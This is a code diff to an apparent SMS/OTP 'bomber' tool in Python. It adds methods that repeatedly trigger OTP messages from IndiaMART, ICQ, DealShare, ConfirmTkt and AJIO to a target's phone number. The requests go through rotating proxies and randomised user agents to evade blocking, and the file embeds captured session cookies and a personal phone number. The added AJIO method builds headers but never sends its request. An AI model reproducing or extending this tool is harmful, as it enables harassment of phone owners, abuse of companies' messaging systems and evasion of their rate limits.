@@ -336,7 +336,7 @@ class Bomber:
             'sec-fetch-site': "same-origin",
             'traceparent': "00-8e75c5def3f3423ef4f1f8c54d3aefe0-8885e53aced18ac0-01",
             'tracestate': "2411613@nr=0-1-2411613-927328108-8885e53aced18ac0----1654417850260",
-            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.30"
+            "user-agent": self.getUserAgent(),
         }
         try:
             request = requests.request("POST", url, data=payload, headers=headers, proxies={
@@ -460,6 +460,122 @@ class Bomber:
         if(request.status_code == 400):
             return True
 
+    def indiamart(self):
+        url = "https://m.indiamart.com/ajaxrequest/identified/common/otpVerification"
+        payload = "{\"user\":"f"{self.user_mobile}"",\"screenName\":\"EDIT PROFILE\",\"type\":\"OTPGEN\",\"authCode\":\"\",\"glusr_id\":\"154146367\",\"ciso\":\"IN\",\"user_mobile_country_code\":\"91\",\"user_country\":\"India\",\"userIp\":\"103.238.108.180\",\"OTPResend\":0,\"emailVerify\":\"\",\"source\":\"\",\"msg_key\":0,\"attribute_id\":\"\",\"verifyUser\":false,\"glid\":\"154146367\"}"
+        headers = {
+            'authority': "m.indiamart.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'cookie': "_gcl_au=1.1.822480747.1654413419; isApp=0; random=0=4|1=2|2=9|3=1|4=10|5=6|6=3|7=8; lang=0; iploc=gcniso%3DIN%7Cgcnnm%3DIndia%7Cgctnm%3DSurat%7Cgctid%3D70490%7Cgacrcy%3D20%7Cgip%3D103.238.108.180; ImeshVisitor=fn%3D%7Cem%3D%7Cphcc%3D91%7Ciso%3DIN%7Cmb1%3D7984430992%7Cpct%3D%7Cctid%3D%7Cglid%3D154146367%7Ccd%3D05%2FJUN%2F2022%7Ccmid%3D%7Cutyp%3DN%7Cev%3D%7Cuv%3D%7Custs%3D%7Cadmln%3D0%7Cadmsales%3D0%7C",
+            'dnt': "1",
+            'origin': "https://m.indiamart.com",
+            'referer': "https://m.indiamart.com/my/profile/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            "user-agent": self.getUserAgent(),
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def icq(self):
+        url = "https://u.icq.net/api/v78/rapi/auth/sendCode"
+        monumber = "91" + self.user_mobile
+        payload = "{\"reqId\":\"52560-1654421401\",\"params\":{\"phone\":"f'"{monumber}"'",\"language\":\"en-US\",\"route\":\"sms\",\"devId\":\"ic1rtwz1s1Hj1O0r\",\"application\":\"icq\"}}"
+        headers = {
+            'authority': "u.icq.net",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'dnt': "1",
+            'origin': "https://web.icq.com",
+            'referer': "https://web.icq.com/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "cross-site",
+            "user-agent": self.getUserAgent(),
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def dealshare(self):
+        url = "https://www.dealshare.in/api/1.0/get-otp"
+        payload = "{\"phoneNumber\":"f"{self.user_mobile}"",\"name\":\"\",\"hashCode\":\"\",\"resendOtp\":1}"
+        headers = {
+            'authority': "www.dealshare.in",
+            'accept': "application/json, text/plain, */*",
+            'accept-language': "en-US,en;q=0.9",
+            'content-type': "application/json",
+            'cookie': "_gcl_au=1.1.773299246.1654418784; _ga=GA1.1.259488213.1654418784; _ga_17JC851ECY=GS1.1.1654418783.1.0.1654418786.0",
+            'dnt': "1",
+            'origin': "https://www.dealshare.in",
+            'referer': "https://www.dealshare.in/",
+            'sec-fetch-dest': "empty",
+            'sec-fetch-mode': "cors",
+            'sec-fetch-site': "same-origin",
+            "user-agent": self.getUserAgent(),
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def confirmtkt(self):
+        url = "https://securedapi.confirmtkt.com/api/platform/registerOutput"
+        querystring = {"mobileNumber": f"{self.user_mobile}",
+                       "newOtp": "true", "retry": "false", "testparamsp": "true"}
+        payload = ""
+        headers = {
+            'authority': "securedapi.confirmtkt.com",
+            'accept': "*/*",
+            'accept-language': "en-US,en;q=0.9",
+            'dnt': "1",
+            'origin': "https://www.confirmtkt.com",
+            'referer': "https://www.confirmtkt.com/",
+            'sec-ch-ua': "^\^"
+        }
+        try:
+            request = requests.request("POST", url, data=payload, headers=headers, proxies={
+                'https': self.getproxy()})
+        except:
+            return False
+        if(request.status_code == 400):
+            return True
+
+    def ajio(self):
+        url = "https://login.web.ajio.com/api/auth/signupSendOTP"
+
+        payload = "{\"firstName\":\"dwwdwd\",\"login\":\"dwwdw@gmail.com\",\"password\":\"Ruunejwdd@8723\",\"genderType\":\"Female\",\"mobileNumber\":"f"{self.user_mobile}"",\"rilFnlRegisterReferralCode\":\"\",\"requestType\":\"SENDOTP\",\"newDesign\":false}"
+        headers = {
+            'cookie': "V=201; TS017df282=01ef61aed01682fc3d8b9c1287ef6c80989c893ab817f88dc1ff1c28ce5e201409227f1ee2a3722011c0f5227130edadd944a2c7c1c8b3e15e2e2641dabebd60d2dd49fab0db8c2ae9f2d0dc5ea747c44f2a6d89492e470e19cd627a64bb83d4a1b86efe8bb97e4f68283d05f768728490b62dfbeaefa013de6c695e5038462373118f1d4647b7c6daeb2d137199fe1b3fbd3293e277dcac9989ca103332e7508b8e50a485bdee79f197c0fa5b748d5b8780c3d662eb20905d134b35084a2bb258e5a197bdbf2a516ead03d2a095b9841622e89383ebc34c2e30f6001cc14a627ea9c99214061acb5972d4b3d00639080c88a73096882f8bd65eeec64c0e927e44394b5e74f00e29eb35ad7a0bf78845898874a0f06f647ecdd773fcbbefad198f04cd9dec91cbbcb630435d7515afc3936e45f148",
+            'Accept-Language': "en-US,en;q=0.9",
+            'Connection': "keep-alive",
+            'DNT': "1",
+            'Origin': "https://www.ajio.com",
+            'Referer': "https://www.ajio.com/",
+            'Sec-Fetch-Dest': "empty",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Site': "same-site",
+            "user-agent": self.getUserAgent(),
+            'accept': "application/json",
+            'content-type': "application/json",
+        }
+
     def startBombing(self):
         if(self._checkinternet()):
             counter = 0
@@ -500,6 +616,19 @@ class Bomber:
                     counter += 1
                 if self.jobhai():
                     counter += 1
+                if self.jiomart():
+                    counter += 1
+                if self.indiamart():
+                    counter += 1
+                if self.icq():
+                    counter += 1
+                if self.dealshare():
+                    counter += 1
+                if self.confirmtkt():
+                    counter += 1
+                if self.ajio():
+                    counter += 1
+
                 if(counter >= self.number_of_messege):
                     break
 
